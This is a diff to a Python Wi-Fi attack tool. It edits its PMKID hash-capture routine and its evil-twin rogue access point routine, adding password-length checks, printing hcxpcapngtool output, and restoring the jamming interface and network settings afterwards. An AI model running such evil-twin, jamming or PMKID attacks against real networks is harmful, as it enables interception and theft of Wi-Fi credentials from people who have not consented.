@@ -1,4 +1,4 @@
-#!
+#!/home/filip/Coding/WiFighter/venv/bin/python3
 
 # | IMPORT | #
 
@@ -1012,6 +1012,7 @@ def pmkid_attack(target_ap, interface, target):
                          command = ['sudo', 'hcxpcapngtool', '-o', f'{output_dir}/pmkid_hash', f'{output_dir}/{output_file}']
                     verify = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                     output = str(verify.communicate())
+                    print(output)
                except:
                     pass
                # Extract the caught PMKID's number value
@@ -1160,6 +1161,7 @@ def evil_twin(target_ap, twin_mode):
      bssid = target_ap['BSSID'] if target_ap['BSSID'] else None
      channel = target_ap['Channel'] if target_ap['Channel'] else None
      band = target_ap['Band'] if target_ap['Band'] else None
+     password = None
 
      jamming_mode = False
      if twin_mode == 'Jamming':
@@ -1277,8 +1279,19 @@ def evil_twin(target_ap, twin_mode):
                          # Check if chosen internet interface has internet connection and DNS resolution is working properly
                          if not check_internet(internet_interface):
                               continue
-
-                         password = str(input('Enter password for Evil Twin Wifi network (Leave blank input for Open Wifi network): '))
+                         
+                         # Prompt the user for Evil Twin AP password (can be blank - no password)
+                         while True:
+                              password = str(input('Enter password for Evil Twin Wifi network [8+ characters] (Leave blank input for Open Wifi network): '))
+                              # Make sure chosen password meets the requirements for WPA2
+                              if password:
+                                   if len(password) >= 8 and 63 >= len(password):
+                                        break
+                                   else:
+                                        print(f"{RED}Password lenght has to be 8 - 63 characters long!{RESET}")
+                                        continue
+                              else:
+                                   break
 
                          break # If all requirements met, stop the interface choosing loop
                else:
@@ -1434,20 +1447,24 @@ macaddr_acl=0
                # Run the Evil Twin AP
                run_command("sudo hostapd /etc/hostapd.conf")
                
-               signal.signal(signal.SIGINT, signal.SIG_IGN) # Start - disable ctrl + c for user 
-               if jamming_mode:
-                    jam_network.terminate() # Stop jammer
-
+               signal.signal(signal.SIGINT, signal.SIG_IGN) # Start - disable ctrl + c for user
                # Restore everything
                print(f'\n{CYAN}[>]{RESET} Restoring interfaces and network configuration')
+               if jamming_mode:
+                    # Stop jammer
+                    jam_network.terminate()
+                    # Put jamming interface back to managed mode
+                    run_command(f"sudo ip link set {jamming_interface} down")
+                    run_command(f"sudo iw dev {jamming_interface} set type managed")
+                    run_command(f"sudo ip link set {jamming_interface} up")
                run_command("sudo systemctl stop dhcpd")
                run_command("sudo iptables -F")
                run_command("sudo iptables -t nat -F")
                run_command("sudo echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
+               run_command(f"sudo ip addr del 192.168.100.1/24 dev {evil_interface}")
                run_command(f"sudo nmcli dev set {evil_interface} managed yes")
                if jamming_mode:
-                    run_command(f"sudo nmcli dev set {jamming_interface} managed yes") # Make the jamming interface manageable for NetworkManager
-               run_command("sudo systemctl restart NetworkManager")
+                    run_command(f"sudo nmcli dev set {jamming_interface} managed yes")
                signal.signal(signal.SIGINT, signal.default_int_handler) # Stop - disable ctrl + c for user 
      else:
           print(f"{RED}\nTarget AP doesn't have SSID set!{RESET}")
